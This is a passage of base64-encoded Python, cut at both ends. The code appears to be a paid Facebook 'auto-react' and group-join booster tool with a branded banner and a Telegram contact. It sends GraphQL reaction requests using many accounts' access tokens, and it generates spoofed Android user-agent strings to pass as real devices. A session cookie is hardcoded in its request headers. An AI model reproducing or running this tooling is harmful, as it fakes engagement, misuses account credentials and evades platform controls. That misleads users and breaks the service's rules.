9tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgICAgICB0b2tlbiA9IGZ1dHVyZV90b190b2tlbltmdXR1cmVdCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgICAgICAgICAgICAgICAgIGpvaW5fY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbMTszMm1bU1VDQ0VTU10gXDAzM1sxOzM3bVN1Y2Nlc3NmdWxseSBqb2luZWQgZ3JvdXAge2dyb3VwX2lkfSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZmFpbGVkX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVtVTlNVQ0NFU1NdIFwwMzNbMTtGQUlMRUQgam9pbmVkIGdyb3VwIHtncm91cF9pZH0iKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICMgU3RvcCByZXRyeWluZyBpZiB3ZSd2ZSByZWFjaGVkIHRoZSBzdWNjZXNzIGxpbWl0CiAgICAgICAgICAgICAgICAgICAgaWYgam9pbl9jb3VudCA+PSBudW1fdG9rZW5zOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbiB7dG9rZW59OiB7ZX0iKQoKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHJpZXNfbGVmdCA9IG51bV90b2tlbnMgLSBqb2luX2NvdW50CgogICAgICAgIHByaW50KCJcMDMzWzE7MzFt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzJtVE9UQUwgU1VDQ0VTU0ZVTDoge2pvaW5fY291bnR9XDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzFtVE9UQUwgRkFJTEVEOiB7ZmFpbGVkX2NvdW50fVwwMzNbMG0iKQpkZWYgbGl2ZSh1cmwpOgogICAgIyBTcGxpdCB0aGUgVVJMIGJ5IHNsYXNoZXMKICAgIHBhcnRzID0gdXJsLnNwbGl0KCcvJykKICAgIAogICAgIyBFbnN1cmUgdGhhdCB0aGUgVVJMIGhhcyBlbm91Z2ggcGFydHMKICAgIGlmIGxlbihwYXJ0cykgPiA0OgogICAgICAgIHVzZXJfaWQgPSBwYXJ0c1szXSAgIyBUaGUgdXNlci9wYWdlIElECiAgICAgICAgdmlkZW9faWQgPSBwYXJ0c1s1XSAgIyBUaGUgdmlkZW8gSUQKICAgICAgICAKICAgICAgICAjIENvbWJpbmUgdGhlbSB3aXRoIGFuIHVuZGVyc2NvcmUKICAgICAgICByZXR1cm4gZiJ7dXNlcl9pZH1fe3ZpZGVvX2lkfSIKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIE5vbmUgICMgUmV0dXJuIE5vbmUgaWYgdGhlIFVSTCBmb3JtYXQgaXMgdW5leHBlY3RlZAppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB1dWlkCmltcG9ydCByYW5kb20KZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwdApmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIHJwCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgcGFuCgppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB1dWlkCmltcG9ydCByYW5kb20KZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwdApmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIHJwCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgcGFuCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgb3MKaW1wb3J0IHJhbmRvbQppbXBvcnQgdXVpZApkYXJrYmx1ZSA9ICJcMDMzWzM0bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVkID0gIlwwMzNbMTszMW0iCnllbGxvdyA9ICJcMDMzWzE7MzNtIgpza3libHVlID0gIlwwMzNbMTszNm0iCmJsdWUgPSAiXDAzM1sxOzM0bSIKbGlnaHRibHVlID0gIlwwMzNbMzg7NTs4MW0iCndoaXRlID0gIlwwMzNbMTszN20iClIgPSAiXDAzM1szMW0iICAjIFJlZApHID0gIlwwMzNbMzJtIiAgIyBHcmVlbgpZID0gIlwwMzNbMzNtIiAgIyBZZWxsb3cKQiA9ICJcMDMzWzM0bSIgICMgQmx1ZQpNID0gIlwwMzNbMzVtIiAgIyBNYWdlbnRhClAgPSAiXDAzM1szNm0iICAjIEN5YW4KQyA9ICJcMDMzWzM3bSIgICMgV2hpdGUKZGVmIGNsZWFyX3NjcmVlbigpOgogICAgaWYgJ3Rlcm11eCcgaW4gcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGVsaWYgcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKSA9PSAnd2luZG93cyc6CiAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgcmUKcHVycGxlID0gIlwwMzNbMTszNW0iCmJsdWUgPSAiXDAzM1szNG0iCmdyZWVuID0gIlwwMzNbMTszMm0iCnJlZCA9ICJcMDMzWzE7MzFtIgp5ZWxsb3cgPSAiXDAzM1sxOzMzbSIKd2hpdGUgPSAiXDAzM1sxOzM3bSIKZGVmIGpvdmFuKCk6CiAgICBhZHJreiA9ICJcMDMzWzM0bSAiCmRlZiBqb3ZhbigpOgogICAgYWRya3ogPSAiXDAzM1szNG0gIgogICAgcHJpbnQoZiIiIgogICAge3JlZH0gCntibHVlfeKVreKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVrgp7Ymx1ZX3ilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7Ymx1ZX0gICAgIOKUggp7Ymx1ZX3ilIIge2hvdHBpbmt9ICAgICAgIOKWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl3tibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWkeKWiOKWiOKVlOKVnSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVlOKVneKWkeKWkeKVmuKWiOKWiOKWiOKVlOKVneKWkeKWkeKVmuKWiOKWiOKWiOKWiOKVlOKVneKWkSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIge2hvdHBpbmt9ICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWiOKWiOKVlOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlOKWiOKWiOKVl+KWkeKWkeKWkeKVmuKWiOKWiOKVlOKVneKWkeKWkSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkXtibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgICB7aG90cGlua30gICAgIOKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVneKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKWkeKWkeKWkeKVmuKVkOKVneKWkeKWkeKWkXtibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtibHVlfSAgICAgICAgIOKUggp7Ymx1ZX3ilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIB7Q30gRCBFIFYgRSBMIE8gUCBFIFIgIEcgTCBJIFQgQyBIIEIgWSBBIE4gTiBFIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVrwog4pWt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAe0N9VE9PTCBJTkZPUk1BVElPTntCfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVriB7Ymx1ZX0gICDila3ilIDilIDilIDilIDilIDilIDilIDilIB7Q31VU0VSIElORk9STUFUSU9Oe0J94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWuCiDilIIge3JlZH3igKJ7aG90cGlua30gT1dORVIgICA6IHtncmVlbn1HbGFpemVsIEFubmUgICAge2JsdWV9ICAgIOKUgiAgIHtibHVlfSDilIIge3JlZH3igKIge2hvdHBpbmt9U1RBVFVTICAgOiB7Z3JlZW59QUNUSVZFICAgICAgICB7Ymx1ZX0gICAgIOKUggog4pSCe3JlZH0g4oCiIHtob3RwaW5rfVVTRVMgICAgOiB7Z3JlZW59Qk9PU1RJTkcgICAgICAge2JsdWV9ICAgICDilIIge2JsdWV9ICAg4pSCIHtyZWR94oCiIHtob3RwaW5rfUNPVU5UUlkgIDp7Z3JlZW59IFBISUxJUFBJTkVTICAgIHtibHVlfSAgICDilIIKIOKUgntyZWR9IOKAoiB7aG90cGlua31ORVRXT1JLIDoge2dyZWVufUFMTCBORVRXT1JLICAgICB7Ymx1ZX0gICAg4pSCICAge2JsdWV9IOKUgiB7cmVkfeKAoiB7aG90cGlua31URUxFR1JBTSA6IHtncmVlbn1Ac2V2aTAyICAgICAgICAge2JsdWV9ICDilIIKIOKUgiB7cmVkfeKAoiB7aG90cGlua31WRVJTSU9OIDoge2dyZWVufTUuMCAgICAgIHtibHVlfSAgICAgICAgICAg4pSCe2JsdWV9ICAgIOKUgiB7cmVkfeKAoiB7aG90cGlua31UT09MUyAgICA6IHtncmVlbn1QQUlERUQgICAgICAge2JsdWV9ICAgICAg4pSCCiDilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDila8gICAg4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWvIiIiKQpwdXJwbGUgPSAiXDAzM1sxOzM1bSIKYmx1ZSA9ICJcMDMzWzM0bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVkID0gIlwwMzNbMTszMW0iCnllbGxvdyA9ICJcMDMzWzE7MzNtIgp3aGl0ZSA9ICJcMDMzWzE7MzdtIgppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKZGVmIGdldF9jb21iaW5lZF9kYXRhKHVybCk6CiAgICAiIiIKICAgIEZldGNoIHRoZSByZXNwb25zZSBmcm9tIHRoZSBnaXZlbiBVUkwgYW5kIGV4dHJhY3QgdGhlIGBhY3Ryc2AgbnVtYmVyIGFuZCBgcG9zdF9pZGAuCiAgICBDb21iaW5lIHRoZXNlIHZhbHVlcyBhbmQgcmV0dXJuIHRoZSByZXN1bHQuCgogICAgQXJnczoKICAgICAgICB1cmwgKHN0cik6IFRoZSBVUkwgdG8gZmV0Y2ggZGF0YSBmcm9tLgoKICAgIFJldHVybnM6CiAgICAgICAgc3RyOiBUaGUgY29tYmluZWQgc3RyaW5nIG9mIGBhY3Ryc2AgbnVtYmVyIGFuZCBgcG9zdF9pZGAsIG9yIGFuIGVycm9yIG1lc3NhZ2UuCiAgICAiIiIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYiLAogICAgICAgICdBY2NlcHQnOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43IiwKICAgICAgICAnY2FjaGUtY29udHJvbCc6ICJtYXgtYWdlPTAiLAogICAgICAgICdkcHInOiAiMiIsCiAgICAgICAgJ3ZpZXdwb3J0LXdpZHRoJzogIjk4MCIsCiAgICAgICAgJ3NlYy1jaC11YSc6ICJcIkdvb2dsZSBDaHJvbWVcIjt2PVwiMTMxXCIsIFwiQ2hyb21pdW1cIjt2PVwiMTMxXCIsIFwiTm90X0EgQnJhbmRcIjt2PVwiMjRcIiIsCiAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAiPzAiLAogICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAiXCJMaW51eFwiIiwKICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAiXCJcIiIsCiAgICAgICAgJ3NlYy1jaC11YS1tb2RlbCc6ICJcIlwiIiwKICAgICAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogIlwiR29vZ2xlIENocm9tZVwiO3Y9XCIxMzEuMC42Nzc4LjEwNFwiLCBcIkNocm9taXVtXCI7dj1cIjEzMS4wLjY3NzguMTA0XCIsIFwiTm90X0EgQnJhbmRcIjt2PVwiMjQuMC4wLjBcIiIsCiAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICJsaWdodCIsCiAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAiMSIsCiAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogInNhbWUtb3JpZ2luIiwKICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAibmF2aWdhdGUiLAogICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICI/MSIsCiAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogImRvY3VtZW50IiwKICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAncHJpb3JpdHknOiAidT0wLCBpIiwKICAgICAgICAnQ29va2llJzogInNiPWZ1WlRaOFp5bDlkWGo1VEZvZGx4RHJHRDsgZHByPTI7IHdkPTk4MHgxNjI4OyBkYXRyPWZ1WlRaeEwtZ3RiQmpUa2ZlQnEtVlZEWiIKICAgIH0KCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpLnRleHQKCiAgICAgICAgIyBFeHRyYWN0IGBhY3Ryc2AgbnVtYmVyCiAgICAgICAgYWN0cnNfbWF0Y2ggPSByZS5zZWFyY2gociciYWN0cnNcXCI6XFwiKFxkKylcXCInLCByZXNwb25zZSkKICAgICAgICBhY3Ryc19udW1iZXIgPSBhY3Ryc19tYXRjaC5ncm91cCgxKSBpZiBhY3Ryc19tYXRjaCBlbHNlIE5vbmUKCiAgICAgICAgIyBFeHRyYWN0IGBwb3N0X2lkYAogICAgICAgIHBvc3RfaWRfbWF0Y2ggPSByZXNwb25zZS5zcGxpdCgnInBvc3RfaWQiOiInKVsxXS5zcGxpdCgnIicpWzBdIGlmICcicG9zdF9pZCI6IicgaW4gcmVzcG9uc2UgZWxzZSBOb25lCgogICAgICAgIGlmIGFjdHJzX251bWJlciBhbmQgcG9zdF9pZF9tYXRjaDoKICAgICAgICAgICAgcmV0dXJuIGYie2FjdHJzX251bWJlcn1fe3Bvc3RfaWRfbWF0Y2h9IgogICAgICAgIGVsaWYgbm90IGFjdHJzX251bWJlcjoKICAgICAgICAgICAgcmV0dXJuICJhY3RycyBudW1iZXIgbm90IGZvdW5kISIKICAgICAgICBlbGlmIG5vdCBwb3N0X2lkX21hdGNoOgogICAgICAgICAgICByZXR1cm4gInBvc3RfaWQgbm90IGZvdW5kISIKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIGYiQW4gZXJyb3Igb2NjdXJyZWQ6IHtzdHIoZSl9IgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBpZiAndGVybXV4JyBpbiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgZWxpZiBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpID09ICd3aW5kb3dzJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgZ2VuZXJhdGVfdXNlcl9hZ2VudCgpOgogICAgZmJhdiA9IGYie3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfSIKICAgIGZiYnYgPSBzdHIocmFuZG9tLnJhbmRpbnQoMTExMTExMTExLCA5OTk5OTk5OTkpKQogICAgZmJydiA9ICcwJwogICAgcmFuZG9tX3NlZWQgPSByYW5kb20uUmFuZG9tKCkKICAgIGFkaWQgPSAnJy5qb2luKHJhbmRvbV9zZWVkLmNob2ljZXMoc3RyaW5nLmhleGRpZ2l0cywgaz0xNikpCgogICAgIyBSYW5kb21seSB2YXJ5IHRoZSBBbmRyb2lkIE9TIHZlcnNpb24sIGRldmljZSwgYW5kIGFwcCB2ZXJzaW9uIGZvciByZWFsaXNtCiAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKFsiSFVBV0VJIE1BUi1MWDFNIiwgIlNhbXN1bmcgU00tRzk2MEYiLCAiT25lUGx1cyBHTTE5MTMiXSkKICAgIGZiYXZfdmVyc2lvbiA9IHN0cihyYW5kb20ucmFuZGludCg0OSwgMTUwKSkgICMgVXBkYXRlZCByYW5nZSBmb3IgRkJBViB2ZXJzaW9ucwogICAgZmJidl92ZXJzaW9uID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA3Nzc3Nzc3NykpCiAgICBjYXJyaWVyID0gcmFuZG9tLmNob2ljZShbIk9vcmVkb28gVE4iLCAiT3JhbmdlIiwgIlZvZGFmb25lIiwgIlQtTW9iaWxlIl0pCgogICAgdWFfYmdyYXBoID0gZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZfdmVyc2lvbn0uMC4wLntyYW5kb20ucmFuZHJhbmdlKDIwLCA0OSl9LntyYW5kb20ucmFuZGludCgxMSwgOTkpfTtGQkJWL3tmYmJ2X3ZlcnNpb259OycgXAogICAgICAgICAgICAgICAgZidbRkJBTi9GQjRBO0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTA3fX07RkJMQy9mcl9GUjsnIFwKICAgICAgICAgICAgICAgIGYnRkJSVi97ZmJydn07RkJDUi97Y2Fycmllcn07RkJNRi97ZGV2aWNlLnNwbGl0KCIgIilbMF19O0ZCQkQve2RldmljZS5zcGxpdCgiICIpWzBdfTsnIFwKICAgICAgICAgICAgICAgIGYnRkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYve2RldmljZX07RkJTVi85O0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdJwogICAgCiAgICByZXR1cm4gdWFfYmdyYXBoCgp1YV9iZ3JhcGggPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKCmRlZiBBdXRvUmVhY3QyKCk6CiAgICBkZWYgUmVhY3Rpb24oYWN0b3JfaWQ6IHN0ciwgcG9zdF9pZDogc3RyLCByZWFjdDogc3RyLCB0b2tlbjogc3RyKSAtPiBib29sOgogICAgICAgIHJ1aSA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgIHVzZXJfYWdlbnQgPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKICAgICAgICBydWkuaGVhZGVycy51cGRhdGUoeyJVc2VyLUFnZW50IjogdXNlcl9hZ2VudH0pICAgICAgICAKICAgICAgICBmZWVkYmFja19pZCA9IHN0cihiYXNlNjQuYjY0ZW5jb2RlKGYnZmVlZGJhY2s6e3Bvc3RfaWR9Jy5lbmNvZGUoJ3V0Zi04JykpLmRlY29kZSgndXRmLTgnKSkKICAgICAgICB2YXIgPSB7CiAgICAgICAgICAgICJpbnB1dCI6IHsKICAgICAgICAgICAgICAgICJmZWVkYmFja19yZWZlcnJlciI6ICJuYXRpdmVfbmV3c2ZlZWQiLAogICAgICAgICAgICAgICAgInRyYWNraW5nIjogW05vbmVdLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX2lkIjogZmVlZGJhY2tfaWQsCiAgICAgICAgICAgICAgICAiY2xpZW50X211dGF0aW9uX2lkIjogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAibmVjdGFyX21vZHVsZSI6ICJuZXdzZmVlZF91ZmkiLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX3NvdXJjZSI6ICJuYXRpdmVfbmV3c2ZlZWQiLAogICAgICAgICAgICAgICAgImZlZWRiYWNrX3JlYWN0aW9uX2lkIjogcmVhY3QsCiAgICAgICAgICAgICAgICAiYWN0b3JfaWQiOiBhY3Rvcl9pZCwKICAgICAgICAgICAgICAgICJhY3Rpb25fdGltZXN0YW1wIjogc3RyKHRpbWUudGltZSgpKVs6MTBdCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuLAogICAgICAgICAgICAnbWV0aG9kJzogJ3Bvc3QnLAogICAgICAgICAgICAncHJldHR5JzogRmFsc2UsCiAgICAgICAgICAgICdmb3JtYXQnOiAnanNvbicsCiAgICAgICAgICAgICdzZXJ2ZXJfdGltZXN0YW1wcyc6IFRydWUsCiAgICAgICAgICAgICdsb2NhbGUnOiAnaWRfSUQnLAogICAgICAgICAgICAnZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lJzogJ1ZpZXdlclJlYWN0aW9uc011dGF0aW9uJywKICAgICAgICAgICAgJ2ZiX2FwaV9jYWxsZXJfY2xhc3MnOiAnZ3JhcGhzZXJ2aWNlJywKICAgICAgICAgICAgJ2NsaWVudF9kb2NfaWQnOiAnMjg1Nzc4NDA5MzUxODIwNTc4NTExNTI1NTY5NycsCiAgICAgICAgICAgICd2YXJpYWJsZXMnOiBqc29uLmR1bXBzKHZhciksCiAgICAgICAgICAgICdmYl9hcGlfYW5hbHl0aWNzX3RhZ3MnOiBbIkdyYXBoU2VydmljZXMiXSwKICAgICAgICAgICAgJ2NsaWVudF90cmFjZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgfQogICAgICAgIHBvcyA9IHJ1aS5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncmFwaHFsJywgZGF0YT1kYXRhKS5qc29uKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHJlYWN0ID09ICcwJzoKICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVNVQ0NFU1NGVUxMWSBSRU1PVkVEIFJFQUNUSU9OIEZST00ge2FjdG9yX2lkfSBPTiB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxpZiByZWFjdCBpbiBzdHIocG9zKToKICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVNVQ0NFU1NGVUxMWSBSRUFDVEVEIFdJVEgge2FjdG9yX2lkfSBUTyB7cG9zdF9pZH0iKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1GQUlMRUQgUkVBQ1RFRCBXSVRIIHthY3Rvcl9pZH0gVE8ge3Bvc3RfaWR9IikKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie3JlZH1SRUFDVElPTiBGQUlMRUQgRFVFIFRPIEFOIEVSUk9SLiIpCiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgIGRlZiBwcm9jZXNzX3JlYWN0aW9uKGFjdG9yX2lkLCB0b2tlbiwgcG9zdF9pZCwgcmVhY3QpOgogICAgICAgIGdsb2JhbCBzdWNjZXNzZnVsX3JlYWN0aW9ucwogICAgICAgIGlmIFJlYWN0aW9uKGFjdG9yX2lkPWFjdG9yX2lkLCBwb3N0X2lkPXBvc3RfaWQsIHJlYWN0PXJlYWN0LCB0b2tlbj10b2tlbik6CiAgICAgICAgICAgIHdpdGggY291bnRlcl9sb2NrOgogICAgICAgICAgICAgICAgaWYgc3VjY2Vzc2Z1bF9yZWFjdGlvbnMgPCByZWFjdF9jb3VudDoKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsX3JlYWN0aW9ucyArPSAxCgogICAgZGVmIGNob29zZV9yZWFjdGlvbigpOgogICAgICAgIGxpbmV4KCkKICAgICAgICBwcmludChmIlsxXSBMSUtFIikKICAgICAgICBwcmludChmIlsyXSBMT1ZFIikKICAgICAgICBwcmludChmIlszXSBIQUhBIikKICAgICAgICBwcmludChmIls0XSBXT1ciKQogICAgICAgIHByaW50KGYiWzVdIENBUkUiKQogICAgICAgIHByaW50KGYiWzZdIFNBRCIpCiAgICAgICAgcHJpbnQoZiJbN10gQU5HUlkiKQogICAgICAgIHByaW50KGYiWzhdIFJFTU9WRSBSRUFDVElPTiIpCiAgICAgICAgbGluZXgoKQogICAgICAgIHJlYyA9IGlucHV0KCdceDFiWzE7MzJtQ0hPT1NFIDogJykKICAgIC